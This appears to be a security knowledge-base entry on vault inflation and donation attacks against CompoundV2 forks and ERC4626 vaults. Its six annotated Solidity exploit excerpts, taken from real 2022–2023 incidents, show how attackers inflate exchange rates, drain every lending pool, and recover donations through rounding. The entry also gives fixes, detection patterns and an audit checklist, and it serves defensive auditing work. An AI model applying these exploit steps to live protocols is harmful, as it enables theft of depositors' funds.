---
# Core Classification
protocol: "compound-v2-forks"
chain: "ethereum, optimism, bsc, arbitrum"
category: "economic"
vulnerability_type: "vault_inflation_attack"

# Pattern Identity (Required)
root_cause_family: arithmetic_invariant_break
pattern_key: vault_inflation_attack | exchange_rate_calculation | economic_exploit | fund_loss

# Interaction Scope
interaction_scope: single_contract

# Attack Vector Details
attack_type: "economic_exploit"
affected_component: "exchange_rate_calculation, share_accounting"

# Technical Primitives
primitives:
  - "exchange_rate"
  - "total_supply"
  - "donation"
  - "rounding_error"
  - "empty_market"
  - "compoundv2_fork"
  - "ctoken"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.7
financial_impact: "critical"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "mint"
  - "cToken"
  - "donate"
  - "ERC4626"
  - "deposit"
  - "500_WBTC"
  - "transfer"
  - "balanceOf"
  - "totalShares"
  - "totalSupply"
  - "exchangeRate"
  - "pseudoTotalPool"
  - "_convertToAssets"
  - "_convertToShares"
  - "redeemUnderlying"
path_keys:
  - "empty_market_exchange_rate_inflation"
  - "share_price_inflation_via_donation"

# Context Tags
tags:
  - "defi"
  - "lending"
  - "vault"
  - "inflation"
  - "compoundv2"
  - "erc4626"
  - "first_depositor"
  - "donation_attack"
  - "rounding"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [HF-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-04/HundredFinance_2_exp.sol` |
| [RAFT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-11/Raft_exp.sol` |
| [CHAN-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-12/ChannelsFinance_exp.sol` |
| [ONYX-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-11/OnyxProtocol_exp.sol` |
| [WISE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-10/WiseLending_exp.sol` |
| [LODE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-12/Lodestar_exp.sol` |

---

# CompoundV2 / ERC4626 Vault Inflation Attack Patterns
## Overview

Vault inflation attacks exploit the share-to-asset exchange rate mechanism in CompoundV2 forks, ERC4626 vaults, and similar share-based lending protocols. An attacker manipulates an empty or near-empty market by donating assets directly to the vault contract, inflating the exchange rate so that subsequent share calculations suffer from integer rounding errors. This enables the attacker to borrow against vastly overvalued collateral or redeem donated assets with zero share burn, draining all protocol funds. Between 2022-2023, this attack pattern caused over **$19M** in losses across 6+ protocols.

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `arithmetic_invariant_break` |
| Pattern Key | `vault_inflation_attack | exchange_rate_calculation | economic_exploit | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `single_contract` |
| Chain(s) | ethereum, optimism, bsc, arbitrum |


## 1. Empty Market Exchange Rate Inflation

> **pathShape**: `atomic`

### Root Cause

When a CompoundV2-fork cToken market has extremely low `totalSupply` (e.g., 2 shares), directly transferring the underlying token to the cToken contract inflates the `exchangeRate = totalCash / totalSupply`. With only 2 shares and millions in donated underlying, each share represents millions of dollars in value. The attacker then enters the market with this inflated collateral and borrows from every other lending pool. The rounding error in `redeemUnderlying()` allows recovering the donated funds since `redeemAmount * totalSupply / totalCash` rounds to 0 shares.

### Attack Scenario

1. Flash loan large amount of underlying asset (e.g., WBTC)
2. Deposit small amount to empty cToken market → mint shares
3. Redeem shares until only 2 remain (totalSupply = 2)
4. Donate remaining underlying directly to cToken contract via `transfer()`
5. Enter market as collateral — each of 2 shares now worth millions
6. Borrow 100% of assets from every other lending pool
7. Call `redeemUnderlying()` to recover donated funds — rounding burns 0 shares
8. Repay flash loan with profit

### Vulnerable Pattern Examples

**Example 1: Hundred Finance — Empty cToken Market Inflation ($7M, April 2023)** [Approx Vulnerability: CRITICAL] `@audit` [HF-POC]

```solidity
// ❌ VULNERABLE: CompoundV2 exchangeRate inflated by direct donation to empty market
// No minimum share requirement, no donation protection

// Step 1: Deposit to empty hWBTC market and reduce totalSupply to 2
hWBTC.mint(4 * 1e8);  // Mint hWBTC shares
hWBTC.redeem(hWBTC.totalSupply() - 2);  // Leave only 2 shares

// Step 2: Donate massive WBTC to inflate exchange rate
// @audit exchangeRate = totalCash / totalSupply = 500_WBTC / 2 = 250_WBTC per share
uint256 donationAmount = WBTC.balanceOf(address(this));
WBTC.transfer(address(hWBTC), donationAmount);  // Direct donation — no share mint

// Step 3: Use inflated collateral to drain all markets
address[] memory cTokens = new address[](1);
cTokens[0] = address(hWBTC);
unitroller.enterMarkets(cTokens);
uint256 borrowAmount = CEtherDelegate.getCash() - 1;
CEtherDelegate.borrow(borrowAmount);  // Borrow ALL ETH from protocol

// Step 4: Recover donation via rounding error
// @audit redeemAmount * totalSupply / totalCash rounds to 0 → no shares burned
uint256 redeemAmount = donationAmount - 1;
hWBTC.redeemUnderlying(redeemAmount);
// Attacker recovers donated WBTC while keeping borrowed funds
```

**Example 2: Onyx Protocol — Self-Liquidation Recovery ($2M, November 2023)** [Approx Vulnerability: CRITICAL] `@audit` [ONYX-POC]

```solidity
// ❌ VULNERABLE: Empty market (oPEPE totalSupply=2) + self-liquidation at 1 wei
// CompoundV2 fork allows inflation then uses liquidation to recover shares

// IntermediateContract: inflate exchange rate
PEPE.approve(address(oPEPE), type(uint256).max);
oPEPE.mint(1e18);
oPEPE.redeem(oPEPE.totalSupply() - 2);  // @audit totalSupply = 2
uint256 redeemAmt = PEPE.balanceOf(address(this)) - 1;
PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));  // Donate → inflate

// Enter market and drain target lending pool
address[] memory oTokens = new address[](1);
oTokens[0] = address(oPEPE);
Unitroller.enterMarkets(oTokens);
onyxToken.borrow(onyxToken.getCash() - 1);  // @audit Borrow 100% of target market

// Recover shares: compute exact mint amount for liquidation
(,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));
(, uint256 numSeizeTokens) = Unitroller.liquidateCalculateSeizeTokens(
    address(onyxToken), address(oPEPE), 1
);
uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;
oPEPE.mint(mintAmount);

// Main contract: liquidate intermediate at 1 wei → seize oPEPE shares
onyxToken.liquidateBorrow(address(intermediateToken), 1, address(oPEPE));
oPEPE.redeem(oPEPE.balanceOf(address(this)));
```

**Example 3: Channels Finance — redeemUnderlying Rounding ($320K, December 2023)** [Approx Vulnerability: CRITICAL] `@audit` [CHAN-POC]

```solidity
// ❌ VULNERABLE: Direct LP token transfer inflates cToken underlying balance
// redeemUnderlying rounding allows withdrawal with minimal share burn

// Step 1: Transfer LP tokens to inflate cToken's underlying balance
BTCB_BUSD.transfer(address(cCLP_BTCB_BUSD), BTCB_BUSD.balanceOf(address(this)));
cCLP_BTCB_BUSD.accrueInterest();

// Step 2: Enter all markets with inflated collateral value
address[] memory cTokens = Comptroller.getAllMarkets();
Comptroller.enterMarkets(cTokens);

// Step 3: Borrow ALL available tokens from every market
for (uint256 i; i < tokensToSteal.length; ++i) {
    uint256 amountToSteal = tokensToSteal[i].getCash();
    tokensToSteal[i].borrow(amountToSteal);  // @audit Drains each market to 0
}

// Step 4: Redeem underlying with rounding error
// @audit redeemUnderlying: sharesBurned = amount * totalSupply / totalCash
// With totalSupply=2 and huge totalCash, sharesBurned rounds to 0 or 1
uint256 redeemAmount = cCLP_BTCB_BUSD.getCash();
cCLP_BTCB_BUSD.redeemUnderlying(redeemAmount - reserves - 1e9);
```

---

## 2. Share Price Inflation via Donation

> **pathShape**: `iterative-loop`

### Root Cause

Protocols that track asset balances using variables like `pseudoTotalPool` are vulnerable when the actual token balance can be inflated via direct `transfer()` without minting new shares. The ratio `assets / shares` becomes artificially high, and any subsequent withdrawal or borrow calculation that divides by this inflated ratio produces rounding-to-zero errors, allowing zero-cost asset extraction.

### Attack Scenario

1. Create a position with minimal shares (1 share per position)
2. Donate large amount of underlying to protocol contract
3. The `pseudoTotalPool` or equivalent increases but `totalShares` stays constant
4. Borrow all assets from other pools using inflated collateral value
5. Loop `withdrawExactAmount()` — share calculation rounds to 0, free withdrawal each iteration

### Vulnerable Pattern Examples

**Example 4: Wise Lending — pseudoTotalPool Inflation ($260K, October 2023)** [Approx Vulnerability: CRITICAL] `@audit` [WISE-POC]

```solidity
// ❌ VULNERABLE: Direct WBTC donation inflates pseudoTotalPool
// withdrawExactAmount share calculation rounds to 0

// Step 1: Create positions with 1 share each
WiseLending.depositExactAmount(recoverID, address(WBTC), 1);  // 1 share
WiseLending.depositExactAmount(borrowerID, address(WBTC), 1); // 1 share

// Step 2: Donate to inflate share price
// @audit pseudoTotalPool += 50 WBTC; totalDepositShares unchanged (still 2)
WBTC.transfer(address(WiseLending), 50 * 1e8 - 2);

// Step 3: Borrow everything against inflated collateral
WiseLending.borrowExactAmount(id, address(wstETH), 33_538_664_799_002_267_467);
WiseLending.borrowExactAmount(id, address(WETH), 339_996_372_423_526_589);
WiseLending.borrowExactAmount(id, address(aEthWETH), 98_969_695_913_405_122_899);

// Step 4: Recovery loop — precision loss allows free withdrawal
// @audit shareAmount = withdrawAmount * totalShares / pseudoTotalPool rounds to 0
while (WiseLending.getPseudoTotalPool(address(WBTC)) > 2_000_000) {
    uint256 recoverAmount =
        (WiseLending.getPseudoTotalPool(address(WBTC)) - 1)
        / WiseLending.getTotalDepositShares(address(WBTC));
    WiseLending.withdrawExactAmount(positionID, address(WBTC), recoverAmount);
}
```

**Example 5: Raft.fi — Index Inflation via Liquidation ($3.2M, November 2023)** [Approx Vulnerability: CRITICAL] `@audit` [RAFT-POC]

```solidity
// ❌ VULNERABLE: donating cbETH to Position Manager inflates currentIndex
// setIndex called during liquidation reads inflated balance
// Subsequent mints use 1 wei cbETH per 1 wei rcbETH-c due to precision loss

// Step 1: Donate cbETH to Position Manager → inflate balance
cbETH.transfer(address(PRM), cbETH.balanceOf(address(this)));

// Step 2: Liquidation triggers setIndex using inflated balance
// @audit currentIndex inflated ~6000x
PRM.liquidate(liquidablePosition);

// Step 3: Mint collateral tokens for 1 wei each (precision loss)
for (uint256 i; i < (60 + rcbETH_c_HeldbyAttacker); i++) {
    PRM.managePosition(
        cbETH, address(this),
        1,      // collateralChange = 1 wei cbETH
        true,   // isCollateralIncrease
        0, true, 1e18, ERC20PermitSignature
    );  // @audit amount / inflatedIndex rounds to minimum → free collateral tokens
}

// Step 4: Redeem all donated cbETH
uint256 collateralChange = cbETH.balanceOf(address(PRM));
PRM.managePosition(cbETH, address(this), collateralChange, false, 0, true, 1e18, sig);

// Step 5: Borrow stablecoin against accumulated collateral
uint256 debtChange = collateralAmount * EtherPrice * 100 / 130
    - rcbETH_d.balanceOf(address(this));
PRM.managePosition(cbETH, address(this), 0, true, debtChange, true, 1e18, sig);
```

**Example 6: Lodestar Finance — Vault Donate Inflation ($6.5M, December 2022)** [Approx Vulnerability: CRITICAL] `@audit` [LODE-POC]

```solidity
// ❌ VULNERABLE: GlpDepositor.donate() inflates plvGLP exchange rate
// without minting new plvGLP shares, making collateral worth more

// Step 1: Borrow/re-deposit plvGLP in loop to accumulate position
USDC.approve(address(IUSDC), USDC.balanceOf(address(this)));
IUSDC.mint(USDC.balanceOf(address(this)));  // Deposit USDC as base collateral
unitroller.enterMarkets(cTokens);
for (uint256 i = 0; i < 16; i++) {
    uint256 PlvGlpTokenAmount = PlvGlpToken.balanceOf(address(lplvGLP));
    lplvGLP.borrow(PlvGlpTokenAmount);  // Borrow all plvGLP
    lplvGLP.mint(PlvGlpTokenAmount);    // Re-deposit as collateral
}

// Step 2: Donate GLP to inflate plvGLP exchange rate
// @audit plvGLP pricePerShare = totalGLP / totalPlvGLP
// donate() increases totalGLP without minting new plvGLP shares
sGLP.approve(address(depositor), glpAmount);
depositor.donate(glpAmount);  // Inflates plvGLP price

// Step 3: With inflated collateral, borrow everything
IUSDC.borrow(USDC.balanceOf(address(IUSDC)));  // @audit Drain ALL USDC
IETH.borrow(address(IETH).balance);              // @audit Drain ALL ETH
IMIM.borrow(MIM.balanceOf(address(IMIM)));        // @audit Drain ALL MIM
IUSDT.borrow(USDT.balanceOf(address(IUSDT)));
IFRAX.borrow(FRAX.balanceOf(address(IFRAX)));
IDAI.borrow(DAI.balanceOf(address(IDAI)));
IWBTC.borrow(WBTC.balanceOf(address(IWBTC)));
```

---

## Impact Analysis

### Technical Impact
- Complete drainage of ALL lending pools in the protocol (not just the manipulated market)
- Exchange rate permanently corrupted — protocol becomes insolvent
- Rounding errors allow asset extraction without corresponding share burn
- Self-liquidation mechanisms enable recovery of attacker's own inflated collateral

### Business Impact
- **Total losses 2022-2023:** $19M+ across 6 protocols (Hundred Finance $7M, Lodestar $6.5M, Raft.fi $3.2M, Onyx $2M, Channels Finance $320K, Wise Lending $260K)
- Affects ALL CompoundV2 forks with empty/low-utilization markets
- ERC4626 vaults without first-depositor protection are equally vulnerable
- Multi-market lending protocols face total insolvency (attacker drains every pool)

### Affected Scenarios
- Any CompoundV2-fork with newly deployed or empty cToken markets
- ERC4626 vaults that accept direct token transfers without adjusting share accounting
- Lending protocols with `donate()` or `transfer()` functions that affect exchange rate calculation
- Protocols where `redeemUnderlying()` or `withdrawExactAmount()` rounds down share burn

---

## Secure Implementation

**Fix 1: Virtual Shares and Virtual Assets (EIP-4626 Recommended)**
```solidity
// ✅ SECURE: Add virtual offset to prevent exchange rate manipulation
// OpenZeppelin ERC4626 implementation with virtual shares

function _convertToShares(uint256 assets, Math.Rounding rounding) internal view returns (uint256) {
    return assets.mulDiv(
        totalSupply() + 10 ** _decimalsOffset(),  // Virtual shares offset
        totalAssets() + 1,                          // Virtual asset offset
        rounding
    );
}

function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view returns (uint256) {
    return shares.mulDiv(
        totalAssets() + 1,
        totalSupply() + 10 ** _decimalsOffset(),
        rounding
    );
}
// With _decimalsOffset() = 3, attacker needs to donate 1000x more to achieve the same inflation
```

**Fix 2: Minimum Share Requirement (First Depositor Lock)**
```solidity
// ✅ SECURE: Lock minimum shares on first deposit to prevent empty market attack
function mint(uint256 mintAmount) external returns (uint256) {
    uint256 shares = calculateShares(mintAmount);
    
    if (totalSupply == 0) {
        // Dead shares: permanently lock MINIMUM_SHARES to prevent inflation
        uint256 MINIMUM_SHARES = 1000;
        require(shares > MINIMUM_SHARES, "Initial deposit too small");
        _mint(address(0xdead), MINIMUM_SHARES);  // Burn minimum shares
        shares -= MINIMUM_SHARES;
    }
    
    _mint(msg.sender, shares);
    // ...
}
```

**Fix 3: Track Internal Balance (Prevent Direct Donation)**
```solidity
// ✅ SECURE: Use internal accounting instead of balanceOf()
contract SecureLendingPool {
    mapping(address => uint256) internal _totalDeposited;
    
    function exchangeRate() public view returns (uint256) {
        if (totalSupply == 0) return INITIAL_EXCHANGE_RATE;
        // Use tracked balance, NOT token.balanceOf(address(this))
        return _totalDeposited[token] * 1e18 / totalSupply;
    }
    
    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        _totalDeposited[token] += amount;  // Only deposits count
        uint256 shares = amount * totalSupply / _totalDeposited[token];
        _mint(msg.sender, shares);
    }
    
    // Direct transfer() to contract does NOT inflate exchange rate
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- `exchangeRate = totalCash / totalSupply` with totalSupply < 1000
- `redeemUnderlying()` with rounding-down share calculation
- No virtual shares/assets offset in ERC4626 implementations
- `token.balanceOf(address(this))` used in share price calculation (vulnerable to donation)
- Missing minimum share lock on first deposit
- Empty/low-utilization cToken markets accepted as collateral
- `donate()` or `transfer()` functions that affect vault exchange rate
- `pseudoTotalPool` or similar tracked by actual balance, not deposits
```

### Audit Checklist
- [ ] Does the protocol use virtual shares offset (per EIP-4626)?
- [ ] Is there a minimum share lock for first depositors?
- [ ] Does `exchangeRate` use tracked internal balance or `balanceOf()`?
- [ ] Can `redeemUnderlying()` round share burn to 0?
- [ ] Are newly deployed/empty markets immediately usable as collateral?
- [ ] Does any `donate()` function affect the share-to-asset ratio?
- [ ] Is there a minimum borrow amount to prevent 1-wei liquidation attacks?
- [ ] Are there flash loan guards on deposit + borrow in same transaction?

---

## Real-World Examples

### Known Exploits
- **Hundred Finance** — CompoundV2 empty market inflation, Optimism — April 2023 — $7M
  - Root cause: Empty hWBTC market, donation inflated exchange rate, rounding in redeemUnderlying
- **Raft.fi** — Index inflation via donation + liquidation trigger — November 2023 — $3.2M
  - Root cause: cbETH donated to Position Manager, liquidation trigger inflated currentIndex 6000x
- **Onyx Protocol** — Empty oPEPE market, self-liquidation at 1 wei — November 2023 — $2M
  - Root cause: oPEPE totalSupply=2, donate PEPE, borrow all markets, self-liquidate intermediate
- **Lodestar Finance** — plvGLP donate() inflates exchange rate — December 2022 — $6.5M
  - Root cause: GlpDepositor.donate() increases GLP without minting plvGLP shares
- **Channels Finance** — Direct LP transfer + redeemUnderlying rounding — December 2023 — $320K
  - Root cause: Transfer LP tokens to cToken, rounding burns only 1 cToken out of total
- **Wise Lending** — pseudoTotalPool inflation via direct transfer — October 2023 — $260K
  - Root cause: WBTC donated inflates pseudoTotalPool, withdrawExactAmount rounds shares to 0

---

## Prevention Guidelines

### Development Best Practices
1. Implement virtual shares and virtual assets offset per OpenZeppelin's ERC4626
2. Lock minimum dead shares (e.g., 1000) on first deposit to prevent totalSupply manipulation
3. Use internal balance tracking instead of `balanceOf()` for exchange rate calculations
4. Set minimum borrow amounts to prevent 1-wei liquidation attacks
5. Require minimum utilization before allowing new markets as collateral

### Testing Requirements
- Unit tests for: first deposit with very small amounts, exchange rate after direct token transfer
- Integration tests for: borrow + redeem flow with totalSupply = 2, cross-market borrowing with inflated collateral
- Fuzzing targets: `redeemUnderlying()` rounding with extreme exchange rates, `withdrawExactAmount()` with inflated pool balance
- Invariant tests: `totalAssets >= totalShares * minExchangeRate`, no single-tx deposit+borrow+redeem

---

## Keywords for Search

> `vault inflation`, `donation attack`, `exchange rate manipulation`, `compoundv2 fork`, `empty market`, `first depositor`, `totalSupply manipulation`, `rounding error`, `redeemUnderlying`, `share price inflation`, `ERC4626`, `cToken`, `dead shares`, `virtual shares`, `pseudoTotalPool`, `donate`, `balanceOf manipulation`, `self-liquidation`, `empty pool`, `collateral inflation`, `lending pool drain`, `exchange rate rounding`

---

## Related Vulnerabilities

- `DB/general/precision/` — Rounding and precision loss patterns
- `DB/general/flash-loan-attacks/` — Flash loan attack patterns
- `DB/general/business-logic/defihacklabs-share-accounting-patterns.md` — Share/vault accounting flaws
- `DB/general/rounding-precision-loss/` — Integer rounding exploitation
